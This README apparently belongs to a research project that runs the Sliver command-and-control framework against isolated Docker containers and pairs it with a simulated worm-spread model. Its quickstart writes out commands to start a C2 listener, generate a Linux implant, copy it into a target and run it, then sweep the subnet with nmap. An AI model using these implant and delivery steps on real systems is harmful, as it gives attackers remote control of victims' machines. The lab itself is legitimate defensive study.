# linux-worm-c2

A defensive research lab that combines the [Sliver](https://github.com/BishopFox/sliver)
Command-and-Control framework with an **abstract** Linux worm-propagation simulator.

The project studies three questions in an isolated Docker lab:

1. How does a C2 operator observe a remote agent (Sliver sessions, beacons, listeners)?
2. How does network discovery map a set of live hosts into an asset inventory?
3. How does an infection spread on that inventory under a simple probabilistic model?

**The simulator models events; it does not deploy self-replicating malware.** All
targets live on a dedicated Docker bridge (`worm-lab`, `172.28.0.0/24`) that is
unreachable from the host's LAN and the internet.

## Architecture

   Operator (kali)
        │  sliver client ─── 127.0.0.1:31337 (mTLS, loopback)
        ▼
   Sliver Server (systemd: sliver.service)
        │  HTTPS listener on 172.28.0.1:443
        ▼
   worm-target-1 / -2 / -3  (Ubuntu 22.04 containers on worm-lab)
        │
        │  session events → logs/c2-events.jsonl
        ▼
   network-discovery/     nmap -sn on 172.28.0.0/24
        │  asset-inventory/nodes.json
        ▼
   propagation-simulator/
        │  graph_builder.py → graph.json
        │  simulate.py      → logs/propagation-timeline.jsonl
        ▼
   monitoring/dashboard/  → timeline.png, graph.png

## Quickstart

See `docs/setup.md` for a full reproducible install. The short version:

```bash
# 1. Docker targets
cd lab/docker && docker compose -f docker-compose.targets.yml up -d

# 2. Sliver listener (in the sliver console)
sliver > https --lhost 172.28.0.1 --lport 443

# 3. Generate, deliver, run an implant on worm-target-1
sliver > generate --http 172.28.0.1:443 --os linux --arch amd64 \
         --skip-symbols --save sliver-c2/implants/lab-implant
docker cp sliver-c2/implants/lab-implant worm-target-1:/tmp/lab-implant
docker exec -d worm-target-1 chmod +x /tmp/lab-implant
docker exec -d worm-target-1 /tmp/lab-implant

# 4. Discovery
sudo nmap -sn -PE -PS22,80,443 172.28.0.0/24 -oX network-discovery/host-discovery/scan.xml
python3 network-discovery/asset-inventory/parse_scan.py \
        network-discovery/host-discovery/scan.xml \
        network-discovery/asset-inventory/nodes.json

# 5. Simulation
python3 propagation-simulator/node-mapping/graph_builder.py \
        network-discovery/asset-inventory/nodes.json \
        propagation-simulator/node-mapping/graph.json
python3 propagation-simulator/propagation-events/simulate.py \
        propagation-simulator/node-mapping/graph.json \
        logs/c2-events.jsonl \
        logs/propagation-timeline.jsonl

# 6. Visualisation
python3 monitoring/dashboard/plot_timeline.py \
        logs/propagation-timeline.jsonl \
        propagation-simulator/node-mapping/graph.json \
        monitoring/dashboard/output/timeline.png
python3 monitoring/dashboard/plot_graph.py \
        propagation-simulator/node-mapping/graph.json \
        logs/propagation-timeline.jsonl \
        monitoring/dashboard/output/graph.png
